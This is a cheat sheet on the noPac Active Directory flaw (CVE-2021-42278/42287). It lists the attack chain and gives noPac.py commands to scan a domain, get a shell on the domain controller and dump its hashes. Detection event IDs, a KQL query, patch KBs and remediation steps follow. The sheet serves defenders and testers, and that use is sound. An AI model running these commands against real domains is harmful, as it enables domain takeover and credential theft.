# API Reference: noPac (CVE-2021-42278/42287)

## Vulnerability Overview

### CVE-2021-42278 — sAMAccountName Spoofing
Allows renaming a machine account's sAMAccountName to match a DC name (without trailing $).

### CVE-2021-42287 — KDC Confusion
KDC fails to verify PAC when sAMAccountName doesn't match, granting DC-level TGT.

### Attack Chain
1. Create machine account (MachineAccountQuota > 0)
2. Rename machine sAMAccountName to DC name (e.g., DC01)
3. Request TGT for spoofed name
4. Rename back to original
5. Request S4U2Self — KDC returns ticket as DC$

## noPac.py (Impacket)

### Scan for Vulnerability
```bash
noPac.py domain.local/user:password -dc-ip 10.10.10.1 --scan
```

### Exploit (Get Shell)
```bash
noPac.py domain.local/user:password -dc-ip 10.10.10.1 \
    -use-ldap -shell
```

### Dump Hashes
```bash
noPac.py domain.local/user:password -dc-ip 10.10.10.1 \
    -use-ldap -dump
```

## Prerequisites

### MachineAccountQuota
```powershell
# Check quota
([ADSI]"LDAP://DC=domain,DC=local")."ms-DS-MachineAccountQuota"
# Default: 10 (any domain user can create 10 machine accounts)
```

### LDAP Query
```ldap
(&(objectClass=domain)(ms-DS-MachineAccountQuota>=1))
```

## Detection

### Event IDs
| Event | Log | Description |
|-------|-----|-------------|
| 4741 | Security | Computer account created |
| 4742 | Security | Computer account changed |
| 4743 | Security | Computer account deleted |
| 4781 | Security | Account renamed |
| 4768 | Security | TGT requested |

### Detection Query
```kql
SecurityEvent
| where EventID == 4781
| where TargetUserName !endswith "$"
| where TargetUserName in ("DC01", "DC02")
```

## Patch Information

### Microsoft KB
| KB | Description |
|----|-------------|
| KB5008380 | November 2021 patch |
| KB5008602 | OOB patch |
| KB5008207 | Cumulative update |

## Remediation
1. Apply KB5008380 patch
2. Set MachineAccountQuota to 0
3. Monitor Event 4741 and 4781 for anomalies
4. Enable PAC validation on all DCs
